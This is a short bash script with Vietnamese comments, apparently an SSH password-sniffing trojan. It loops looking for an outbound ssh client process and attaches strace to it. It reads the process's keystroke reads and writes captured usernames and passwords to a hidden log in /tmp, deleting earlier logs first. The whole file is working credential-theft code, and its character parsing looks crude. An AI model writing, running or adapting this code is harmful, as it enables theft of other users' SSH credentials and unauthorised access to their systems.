#!/bin/bash

# Định nghĩa tên và đường dẫn của file log
log_file="/tmp/.log_sshtrojan2.txt"
strace_log="/tmp/log.txt"

# Xóa các file log nếu tồn tại
if [[ -e $log_file ]]; then 
    rm $log_file
fi
if [[ -e $strace_log ]]; then
    rm $strace_log
fi

echo "Running..."
while true; do
    # Lấy PID của tiến trình SSH
    ssh_pid=$(ps aux | grep -w ssh | grep @ | head -n1 | awk '{print $2}')
    
    if [[ $ssh_pid != "" ]]; then
        echo "SSH PID: $ssh_pid"
        
        # Lấy username từ PID của tiến trình SSH
        ssh_username=$(ps aux | grep ssh | grep @ | awk '{print $12}' | cut -d'@' -f1)
        echo "SSH Username: $ssh_username"
        
        ssh_password=""
        
        # Sử dụng strace để theo dõi hoạt động của tiến trình SSH
        strace -e trace=read,write -p $ssh_pid -f -o $strace_log
        
        # Đọc file log từ strace và ghi thông tin username và password vào file log
        cat $strace_log | while read line; do 
            if [[ $line =~ "read(4, ".*", 1)" ]]; then
                c=$(echo $line | awk '{print $3}' | cut -d'"' -f2)
                if [[ $c == "n" ]]; then
                    echo "SSH Username: $ssh_username" >> $log_file
                    echo "SSH Password: $ssh_password" >> $log_file
                    ssh_password=""
                else
                    ssh_password+="$c"
                fi
            fi
        done
    fi
done
